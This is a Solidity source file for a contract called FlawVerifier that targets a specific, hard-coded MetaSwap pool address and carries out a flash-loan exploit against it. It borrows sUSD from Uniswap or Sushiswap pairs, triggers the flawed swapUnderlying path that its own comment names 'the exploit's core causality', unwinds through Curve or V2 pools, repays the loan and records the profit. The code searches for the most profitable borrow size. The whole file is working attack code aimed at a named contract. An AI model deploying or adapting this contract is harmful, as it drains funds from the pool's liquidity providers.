pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IMetaSwapLike {
    function getToken(uint8 index) external view returns (address);
    function getTokenBalance(uint8 index) external view returns (uint256);
    function calculateSwapUnderlying(uint8 tokenIndexFrom, uint8 tokenIndexTo, uint256 dx)
        external
        view
        returns (uint256);
    function swapUnderlying(uint8 tokenIndexFrom, uint8 tokenIndexTo, uint256 dx, uint256 minDy, uint256 deadline)
        external
        returns (uint256);
}

interface ICurveSUSDLike {
    function get_dy_underlying(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x824dcD7b044D60df2e89B1bB888e66D8BCf41491;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address private constant CURVE_SUSD_POOL = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private constant SUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;

    uint8 private constant META_TOKEN_INDEX = 0;
    uint8 private constant DAI_UNDERLYING_INDEX = 1;
    uint8 private constant USDC_UNDERLYING_INDEX = 2;
    uint8 private constant USDT_UNDERLYING_INDEX = 3;

    uint8 private constant EXIT_KIND_NONE = 0;
    uint8 private constant EXIT_KIND_CURVE = 1;
    uint8 private constant EXIT_KIND_V2_DIRECT = 2;
    uint8 private constant EXIT_KIND_V2_TWO_HOP = 3;

    uint256 private constant MIN_SUSD_TRADE = 1e16;
    uint256 private constant SEARCH_STEPS = 28;
    uint256 private constant NEAR_MISS_BPS = 30;

    struct PairCandidate {
        address pair;
        uint256 reserve;
    }

    struct ExitRoute {
        uint8 kind;
        address pair0;
        address pair1;
        address midToken;
        uint256 quotedOut;
    }

    struct CandidatePlan {
        uint8 baseUnderlyingIndex;
        uint256 susdAmount;
        uint256 quotedRepay;
        uint256 quotedRecovered;
        uint256 quotedNet;
    }

    address private realizedProfitToken;
    uint256 private realizedProfitAmount;

    address private callbackPair;
    uint256 private callbackPreBorrowBalance;
    uint8 private callbackBaseUnderlyingIndex;
    bool private callbackEntered;

    constructor() {}

    function executeOnOpportunity() external {
        realizedProfitToken = address(0);
        realizedProfitAmount = 0;

        IMetaSwapLike target = IMetaSwapLike(TARGET);
        address metaToken;
        try target.getToken(META_TOKEN_INDEX) returns (address token) {
            metaToken = token;
        } catch {
            return;
        }
        if (metaToken != SUSD) {
            return;
        }

        uint256 existingSUSD = IERC20Like(SUSD).balanceOf(address(this));
        if (existingSUSD > 0) {
            _tryOwnedInventory(existingSUSD);
            if (realizedProfitAmount > 0) {
                return;
            }
        }

        PairCandidate memory susdPair = _findBestBorrowPair(SUSD);
        if (susdPair.pair == address(0) || susdPair.reserve == 0) {
            return;
        }

        uint256 cap = _capBorrowAmount(target, susdPair.reserve);
        if (cap == 0) {
            return;
        }

        CandidatePlan memory bestFlash = _findBestFlashPlan(cap);
        if (bestFlash.susdAmount == 0) {
            return;
        }

        uint256[7] memory attempts = [
            bestFlash.susdAmount,
            (bestFlash.susdAmount * 3) / 4,
            bestFlash.susdAmount / 2,
            bestFlash.susdAmount / 4,
            bestFlash.susdAmount / 8,
            (bestFlash.susdAmount * 5) / 8,
            (bestFlash.susdAmount * 7) / 8
        ];

        for (uint256 i = 0; i < attempts.length; ++i) {
            uint256 borrowAmount = attempts[i];
            if (borrowAmount < MIN_SUSD_TRADE || borrowAmount > cap) {
                continue;
            }
            if (!_isFlashPlanWorthTrying(bestFlash.baseUnderlyingIndex, borrowAmount)) {
                continue;
            }

            try this.startFlash(bestFlash.baseUnderlyingIndex, susdPair.pair, borrowAmount) {
                if (realizedProfitAmount > 0) {
                    return;
                }
            } catch {}
        }
    }

    function startFlash(uint8 baseUnderlyingIndex, address pair, uint256 borrowAmount) external {
        require(msg.sender == address(this), "SELF_ONLY");
        require(pair != address(0) && borrowAmount > 0, "BAD_FLASH_PLAN");
        require(!callbackEntered, "CALLBACK_BUSY");
        require(_isSupportedUnderlyingIndex(baseUnderlyingIndex), "BAD_BASE_INDEX");
        require(_pairContainsToken(pair, SUSD), "PAIR_MISMATCH");

        callbackPair = pair;
        callbackPreBorrowBalance = IERC20Like(SUSD).balanceOf(address(this));
        callbackBaseUnderlyingIndex = baseUnderlyingIndex;
        callbackEntered = true;

        address token0 = IUniswapV2PairLike(pair).token0();
        if (token0 == SUSD) {
            IUniswapV2PairLike(pair).swap(borrowAmount, 0, address(this), abi.encode(uint256(1)));
        } else {
            IUniswapV2PairLike(pair).swap(0, borrowAmount, address(this), abi.encode(uint256(1)));
        }

        callbackPair = address(0);
        callbackPreBorrowBalance = 0;
        callbackBaseUnderlyingIndex = 0;
        callbackEntered = false;
    }

    function executeWithInventory(uint8 baseUnderlyingIndex, uint256 susdAmount) external {
        require(msg.sender == address(this), "SELF_ONLY");
        require(_isSupportedUnderlyingIndex(baseUnderlyingIndex), "BAD_BASE_INDEX");
        require(susdAmount > 0, "BAD_INPUT");

        uint256 preSUSD = IERC20Like(SUSD).balanceOf(address(this));
        require(preSUSD >= susdAmount, "INSUFFICIENT_SUSD");

        address baseToken = _baseToken(baseUnderlyingIndex);
        uint256 baseReceived = _swapMetaToBase(baseUnderlyingIndex, susdAmount);
        require(baseReceived > 0, "NO_BASE_OUT");

        uint256 susdRecovered = _liquidateBaseToSUSD(baseToken, baseUnderlyingIndex, baseReceived);
        require(susdRecovered > susdAmount, "ZERO_PROFIT");

        uint256 finalSUSD = IERC20Like(SUSD).balanceOf(address(this));
        require(finalSUSD > preSUSD, "NO_NET_GAIN");

        realizedProfitToken = SUSD;
        realizedProfitAmount = finalSUSD - preSUSD;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(callbackEntered, "NO_CALLBACK");
        require(msg.sender == callbackPair, "UNEXPECTED_PAIR");
        require(sender == address(this), "UNEXPECTED_SENDER");

        uint256 borrowedGross = amount0 > 0 ? amount0 : amount1;
        require(borrowedGross > 0, "NO_BORROWED_AMOUNT");

        uint256 borrowedActual = IERC20Like(SUSD).balanceOf(address(this)) - callbackPreBorrowBalance;
        require(borrowedActual > 0, "NO_BORROW_RECEIVED");

        address baseToken = _baseToken(callbackBaseUnderlyingIndex);
        uint256 baseReceived = _swapMetaToBase(callbackBaseUnderlyingIndex, borrowedActual);
        require(baseReceived > 0, "NO_BASE_OUT");

        uint256 susdRecovered = _liquidateBaseToSUSD(baseToken, callbackBaseUnderlyingIndex, baseReceived);
        require(susdRecovered > 0, "NO_SUSD_RECOVERED");

        uint256 repayAmount = _sameTokenFlashRepay(borrowedGross);
        uint256 finalSUSD = IERC20Like(SUSD).balanceOf(address(this));
        require(finalSUSD >= callbackPreBorrowBalance + repayAmount, "NO_NET_PROFIT");

        _safeTransfer(SUSD, callbackPair, repayAmount);

        finalSUSD = IERC20Like(SUSD).balanceOf(address(this));
        require(finalSUSD > callbackPreBorrowBalance, "ZERO_PROFIT");

        realizedProfitToken = SUSD;
        realizedProfitAmount = finalSUSD - callbackPreBorrowBalance;
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function _tryOwnedInventory(uint256 availableSUSD) internal {
        CandidatePlan memory bestInventory = _findBestInventoryPlan(availableSUSD);
        if (bestInventory.susdAmount == 0) {
            return;
        }

        uint256[6] memory attempts = [
            bestInventory.susdAmount,
            (bestInventory.susdAmount * 3) / 4,
            bestInventory.susdAmount / 2,
            bestInventory.susdAmount / 4,
            bestInventory.susdAmount / 8,
            (bestInventory.susdAmount * 7) / 8
        ];

        for (uint256 i = 0; i < attempts.length; ++i) {
            uint256 susdAmount = attempts[i];
            if (susdAmount < MIN_SUSD_TRADE || susdAmount > availableSUSD) {
                continue;
            }
            if (!_isInventoryPlanWorthTrying(bestInventory.baseUnderlyingIndex, susdAmount)) {
                continue;
            }

            try this.executeWithInventory(bestInventory.baseUnderlyingIndex, susdAmount) {
                if (realizedProfitAmount > 0) {
                    return;
                }
            } catch {}
        }
    }

    function _findBestFlashPlan(uint256 cap) internal view returns (CandidatePlan memory best) {
        uint8[3] memory baseUnderlyingIndices = [DAI_UNDERLYING_INDEX, USDC_UNDERLYING_INDEX, USDT_UNDERLYING_INDEX];

        for (uint256 i = 0; i < baseUnderlyingIndices.length; ++i) {
            uint8 baseUnderlyingIndex = baseUnderlyingIndices[i];
            uint256 amount = cap;

            for (uint256 step = 0; step < SEARCH_STEPS && amount >= MIN_SUSD_TRADE; ++step) {
                best = _considerFlashCandidate(best, baseUnderlyingIndex, amount);

                uint256 threeQuarterAmount = (amount * 3) / 4;
                if (threeQuarterAmount >= MIN_SUSD_TRADE && threeQuarterAmount != amount) {
                    best = _considerFlashCandidate(best, baseUnderlyingIndex, threeQuarterAmount);
                }

                uint256 thirdAmount = amount / 3;
                if (thirdAmount >= MIN_SUSD_TRADE) {
                    best = _considerFlashCandidate(best, baseUnderlyingIndex, thirdAmount);
                }

                amount /= 2;
            }
        }
    }

    function _findBestInventoryPlan(uint256 cap) internal view returns (CandidatePlan memory best) {
        uint8[3] memory baseUnderlyingIndices = [DAI_UNDERLYING_INDEX, USDC_UNDERLYING_INDEX, USDT_UNDERLYING_INDEX];

        for (uint256 i = 0; i < baseUnderlyingIndices.length; ++i) {
            uint8 baseUnderlyingIndex = baseUnderlyingIndices[i];
            uint256 amount = cap;

            for (uint256 step = 0; step < SEARCH_STEPS && amount >= MIN_SUSD_TRADE; ++step) {
                best = _considerInventoryCandidate(best, baseUnderlyingIndex, amount);

                uint256 threeQuarterAmount = (amount * 3) / 4;
                if (threeQuarterAmount >= MIN_SUSD_TRADE && threeQuarterAmount != amount) {
                    best = _considerInventoryCandidate(best, baseUnderlyingIndex, threeQuarterAmount);
                }

                uint256 thirdAmount = amount / 3;
                if (thirdAmount >= MIN_SUSD_TRADE) {
                    best = _considerInventoryCandidate(best, baseUnderlyingIndex, thirdAmount);
                }

                amount /= 2;
            }
        }
    }

    function _considerFlashCandidate(CandidatePlan memory best, uint8 baseUnderlyingIndex, uint256 susdAmount)
        internal
        view
        returns (CandidatePlan memory)
    {
        CandidatePlan memory candidate = _quoteFlashPlan(baseUnderlyingIndex, susdAmount);
        if (_isBetterCandidate(candidate, best)) {
            return candidate;
        }
        return best;
    }

    function _considerInventoryCandidate(CandidatePlan memory best, uint8 baseUnderlyingIndex, uint256 susdAmount)
        internal
        view
        returns (CandidatePlan memory)
    {
        CandidatePlan memory candidate = _quoteInventoryPlan(baseUnderlyingIndex, susdAmount);
        if (_isBetterCandidate(candidate, best)) {
            return candidate;
        }
        return best;
    }

    function _quoteFlashPlan(uint8 baseUnderlyingIndex, uint256 susdAmount)
        internal
        view
        returns (CandidatePlan memory candidate)
    {
        candidate.baseUnderlyingIndex = baseUnderlyingIndex;
        candidate.susdAmount = susdAmount;
        candidate.quotedRepay = _sameTokenFlashRepay(susdAmount);
        candidate.quotedRecovered = _quotedRecoveredSUSD(baseUnderlyingIndex, susdAmount);
        if (candidate.quotedRecovered > candidate.quotedRepay) {
            candidate.quotedNet = candidate.quotedRecovered - candidate.quotedRepay;
        }
    }

    function _quoteInventoryPlan(uint8 baseUnderlyingIndex, uint256 susdAmount)
        internal
        view
        returns (CandidatePlan memory candidate)
    {
        candidate.baseUnderlyingIndex = baseUnderlyingIndex;
        candidate.susdAmount = susdAmount;
        candidate.quotedRepay = susdAmount;
        candidate.quotedRecovered = _quotedRecoveredSUSD(baseUnderlyingIndex, susdAmount);
        if (candidate.quotedRecovered > susdAmount) {
            candidate.quotedNet = candidate.quotedRecovered - susdAmount;
        }
    }

    function _quotedRecoveredSUSD(uint8 baseUnderlyingIndex, uint256 susdAmount) internal view returns (uint256) {
        uint256 baseOut = _quoteExploitLeg(baseUnderlyingIndex, susdAmount);
        if (baseOut == 0) {
            return 0;
        }

        ExitRoute memory route = _bestExitRoute(_baseToken(baseUnderlyingIndex), baseUnderlyingIndex, baseOut);
        return route.quotedOut;
    }

    function _isFlashPlanWorthTrying(uint8 baseUnderlyingIndex, uint256 susdAmount) internal view returns (bool) {
        CandidatePlan memory candidate = _quoteFlashPlan(baseUnderlyingIndex, susdAmount);
        if (candidate.quotedNet > 0) {
            return true;
        }

        if (candidate.quotedRecovered == 0 || candidate.quotedRepay == 0) {
            return false;
        }

        uint256 tolerance = (candidate.quotedRepay * NEAR_MISS_BPS) / 10_000;
        return candidate.quotedRecovered + tolerance >= candidate.quotedRepay;
    }

    function _isInventoryPlanWorthTrying(uint8 baseUnderlyingIndex, uint256 susdAmount) internal view returns (bool) {
        CandidatePlan memory candidate = _quoteInventoryPlan(baseUnderlyingIndex, susdAmount);
        if (candidate.quotedNet > 0) {
            return true;
        }

        if (candidate.quotedRecovered == 0) {
            return false;
        }

        uint256 tolerance = (susdAmount * NEAR_MISS_BPS) / 10_000;
        return candidate.quotedRecovered + tolerance >= susdAmount;
    }

    function _isBetterCandidate(CandidatePlan memory candidate, CandidatePlan memory best)
        internal
        pure
        returns (bool)
    {
        if (candidate.susdAmount == 0 || candidate.quotedRecovered == 0) {
            return false;
        }

        bool candidatePositive = candidate.quotedNet > 0;
        bool bestPositive = best.quotedNet > 0;

        if (candidatePositive != bestPositive) {
            return candidatePositive;
        }

        if (candidate.quotedNet != best.quotedNet) {
            return candidate.quotedNet > best.quotedNet;
        }

        if (candidate.quotedRecovered != best.quotedRecovered) {
            return candidate.quotedRecovered > best.quotedRecovered;
        }

        return candidate.susdAmount < best.susdAmount;
    }

    function _swapMetaToBase(uint8 baseUnderlyingIndex, uint256 susdAmount) internal returns (uint256 baseReceived) {
        address baseToken = _baseToken(baseUnderlyingIndex);
        uint256 preBase = IERC20Like(baseToken).balanceOf(address(this));

        // Keep the exploit's core causality and ordering intact: the terminal action is still
        // MetaSwap.swapUnderlying(meta -> base) with tokenIndexFrom < baseLPTokenIndex.
        // Broader public-AMM unwinds are only used to realize whatever output this call creates.
        _forceApprove(SUSD, TARGET, susdAmount);
        IMetaSwapLike(TARGET).swapUnderlying(META_TOKEN_INDEX, baseUnderlyingIndex, susdAmount, 0, block.timestamp);

        baseReceived = IERC20Like(baseToken).balanceOf(address(this)) - preBase;
    }

    function _liquidateBaseToSUSD(address baseToken, uint8 baseUnderlyingIndex, uint256 baseAmount)
        internal
        returns (uint256 susdRecovered)
    {
        ExitRoute memory route = _bestExitRoute(baseToken, baseUnderlyingIndex, baseAmount);
        require(route.kind != EXIT_KIND_NONE, "NO_EXIT_ROUTE");

        uint256 preSUSD = IERC20Like(SUSD).balanceOf(address(this));

        if (route.kind == EXIT_KIND_CURVE) {
            _forceApprove(baseToken, CURVE_SUSD_POOL, baseAmount);
            ICurveSUSDLike(CURVE_SUSD_POOL)
                .exchange_underlying(_curveUnderlyingIndex(baseUnderlyingIndex), 3, baseAmount, 0);
        } else if (route.kind == EXIT_KIND_V2_DIRECT) {
            _swapExactTokensV2(route.pair0, baseToken, SUSD, baseAmount, address(this));
        } else if (route.kind == EXIT_KIND_V2_TWO_HOP) {
            _swapExactTokensTwoHopV2(route.pair0, route.pair1, baseToken, route.midToken, SUSD, baseAmount);
        } else {
            revert("BAD_EXIT_KIND");
        }

        susdRecovered = IERC20Like(SUSD).balanceOf(address(this)) - preSUSD;
    }

    function _hasAnyExitRoute(uint8 baseUnderlyingIndex, uint256 susdIn) internal view returns (bool) {
        return _quotedRecoveredSUSD(baseUnderlyingIndex, susdIn) > 0;
    }

    function _quoteExploitLeg(uint8 baseUnderlyingIndex, uint256 susdIn) internal view returns (uint256 baseOut) {
        try IMetaSwapLike(TARGET).calculateSwapUnderlying(META_TOKEN_INDEX, baseUnderlyingIndex, susdIn) returns (
            uint256 quotedBase
        ) {
            baseOut = quotedBase;
        } catch {
            baseOut = 0;
        }
    }

    function _bestExitRoute(address baseToken, uint8 baseUnderlyingIndex, uint256 baseAmount)
        internal
        view
        returns (ExitRoute memory best)
    {
        if (baseAmount == 0) {
            return best;
        }

        if (_isSupportedUnderlyingIndex(baseUnderlyingIndex)) {
            try ICurveSUSDLike(CURVE_SUSD_POOL)
                .get_dy_underlying(_curveUnderlyingIndex(baseUnderlyingIndex), 3, baseAmount) returns (
                uint256 quotedSUSD
            ) {
                if (quotedSUSD > best.quotedOut) {
                    best = ExitRoute({
                        kind: EXIT_KIND_CURVE,
                        pair0: address(0),
                        pair1: address(0),
                        midToken: address(0),
                        quotedOut: quotedSUSD
                    });
                }
            } catch {}
        }

        address directPair = _bestPairFor(baseToken, SUSD);
        if (directPair != address(0)) {
            uint256 directOut = _quoteV2PairOut(directPair, baseToken, baseAmount);
            if (directOut > best.quotedOut) {
                best = ExitRoute({
                    kind: EXIT_KIND_V2_DIRECT,
                    pair0: directPair,
                    pair1: address(0),
                    midToken: address(0),
                    quotedOut: directOut
                });
            }
        }

        for (uint256 i = 0; i < 5; ++i) {
            address mid = _commonToken(i);
            if (mid == address(0) || mid == baseToken || mid == SUSD) {
                continue;
            }

            address pair0 = _bestPairFor(baseToken, mid);
            address pair1 = _bestPairFor(mid, SUSD);
            if (pair0 == address(0) || pair1 == address(0) || pair0 == pair1) {
                continue;
            }

            uint256 midOut = _quoteV2PairOut(pair0, baseToken, baseAmount);
            if (midOut == 0) {
                continue;
            }
            uint256 finalOut = _quoteV2PairOut(pair1, mid, midOut);
            if (finalOut > best.quotedOut) {
                best = ExitRoute({
                    kind: EXIT_KIND_V2_TWO_HOP, pair0: pair0, pair1: pair1, midToken: mid, quotedOut: finalOut
                });
            }
        }
    }

    function _capBorrowAmount(IMetaSwapLike target, uint256 pairReserve) internal view returns (uint256) {
        uint256 cap = pairReserve / 12;

        uint256 metaPoolBalance;
        try target.getTokenBalance(META_TOKEN_INDEX) returns (uint256 bal) {
            metaPoolBalance = bal;
        } catch {
            metaPoolBalance = 0;
        }
        if (metaPoolBalance != 0) {
            uint256 poolCap = metaPoolBalance / 8;
            if (cap == 0 || (poolCap != 0 && poolCap < cap)) {
                cap = poolCap;
            }
        }

        return cap;
    }

    function _curveUnderlyingIndex(uint8 baseUnderlyingIndex) internal pure returns (int128) {
        if (baseUnderlyingIndex == DAI_UNDERLYING_INDEX) return 0;
        if (baseUnderlyingIndex == USDC_UNDERLYING_INDEX) return 1;
        if (baseUnderlyingIndex == USDT_UNDERLYING_INDEX) return 2;
        revert("BAD_BASE_INDEX");
    }

    function _baseToken(uint8 baseUnderlyingIndex) internal pure returns (address) {
        if (baseUnderlyingIndex == DAI_UNDERLYING_INDEX) return DAI;
        if (baseUnderlyingIndex == USDC_UNDERLYING_INDEX) return USDC;
        if (baseUnderlyingIndex == USDT_UNDERLYING_INDEX) return USDT;
        revert("BAD_BASE_TOKEN");
    }

    function _isSupportedUnderlyingIndex(uint8 baseUnderlyingIndex) internal pure returns (bool) {
        return baseUnderlyingIndex == DAI_UNDERLYING_INDEX || baseUnderlyingIndex == USDC_UNDERLYING_INDEX
            || baseUnderlyingIndex == USDT_UNDERLYING_INDEX;
    }

    function _findBestBorrowPair(address token) internal view returns (PairCandidate memory best) {
        for (uint256 i = 0; i < 2; ++i) {
            address factory = _factory(i);
            for (uint256 j = 0; j < 5; ++j) {
                address other = _commonToken(j);
                if (other == token) {
                    continue;
                }

                address pair = IUniswapV2FactoryLike(factory).getPair(token, other);
                if (pair == address(0)) {
                    continue;
                }

                uint256 reserve = _pairReserveOf(pair, token);
                if (reserve > best.reserve) {
                    best = PairCandidate({pair: pair, reserve: reserve});
                }
            }
        }
    }

    function _bestPairFor(address tokenA, address tokenB) internal view returns (address bestPair) {
        uint256 bestReserve;
        for (uint256 i = 0; i < 2; ++i) {
            address pair = IUniswapV2FactoryLike(_factory(i)).getPair(tokenA, tokenB);
            if (pair == address(0)) {
                continue;
            }
            uint256 reserve = _pairReserveOf(pair, tokenB);
            if (reserve > bestReserve) {
                bestReserve = reserve;
                bestPair = pair;
            }
        }
    }

    function _factory(uint256 index) internal pure returns (address) {
        if (index == 0) return UNISWAP_V2_FACTORY;
        if (index == 1) return SUSHISWAP_FACTORY;
        revert("BAD_FACTORY_INDEX");
    }

    function _commonToken(uint256 index) internal pure returns (address) {
        if (index == 0) return WETH;
        if (index == 1) return DAI;
        if (index == 2) return USDC;
        if (index == 3) return USDT;
        if (index == 4) return WBTC;
        return address(0);
    }

    function _pairContainsToken(address pair, address token) internal view returns (bool) {
        return IUniswapV2PairLike(pair).token0() == token || IUniswapV2PairLike(pair).token1() == token;
    }

    function _pairReserveOf(address pair, address token) internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == token) {
            return uint256(reserve0);
        }
        if (IUniswapV2PairLike(pair).token1() == token) {
            return uint256(reserve1);
        }
        return 0;
    }

    function _quoteV2PairOut(address pair, address tokenIn, uint256 amountIn) internal view returns (uint256) {
        if (pair == address(0) || amountIn == 0) {
            return 0;
        }

        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();

        uint256 reserveIn;
        uint256 reserveOut;
        if (tokenIn == token0) {
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
        } else if (tokenIn == token1) {
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
        } else {
            return 0;
        }

        if (reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _swapExactTokensV2(address pair, address tokenIn, address tokenOut, uint256 amountIn, address to)
        internal
    {
        uint256 amountOut = _quoteV2PairOut(pair, tokenIn, amountIn);
        require(amountOut > 0, "ZERO_V2_OUT");

        address token0 = IUniswapV2PairLike(pair).token0();
        _safeTransfer(tokenIn, pair, amountIn);
        if (tokenOut == token0) {
            IUniswapV2PairLike(pair).swap(amountOut, 0, to, new bytes(0));
        } else {
            IUniswapV2PairLike(pair).swap(0, amountOut, to, new bytes(0));
        }
    }

    function _swapExactTokensTwoHopV2(
        address pair0,
        address pair1,
        address tokenIn,
        address midToken,
        address tokenOut,
        uint256 amountIn
    ) internal {
        uint256 midOut = _quoteV2PairOut(pair0, tokenIn, amountIn);
        require(midOut > 0, "ZERO_HOP1_OUT");
        uint256 amountOut = _quoteV2PairOut(pair1, midToken, midOut);
        require(amountOut > 0, "ZERO_HOP2_OUT");

        address pair1Token0 = IUniswapV2PairLike(pair1).token0();
        address pair0Token0 = IUniswapV2PairLike(pair0).token0();

        _safeTransfer(tokenIn, pair0, amountIn);
        if (midToken == pair0Token0) {
            IUniswapV2PairLike(pair0).swap(midOut, 0, pair1, new bytes(0));
        } else {
            IUniswapV2PairLike(pair0).swap(0, midOut, pair1, new bytes(0));
        }

        if (tokenOut == pair1Token0) {
            IUniswapV2PairLike(pair1).swap(amountOut, 0, address(this), new bytes(0));
        } else {
            IUniswapV2PairLike(pair1).swap(0, amountOut, address(this), new bytes(0));
        }
    }

    function _sameTokenFlashRepay(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (_didSucceed(ok, data)) {
            return;
        }
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(_didSucceed(ok, data), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(_didSucceed(ok, data), "TRANSFER_FAILED");
    }

    function _didSucceed(bool ok, bytes memory data) internal pure returns (bool) {
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }
}
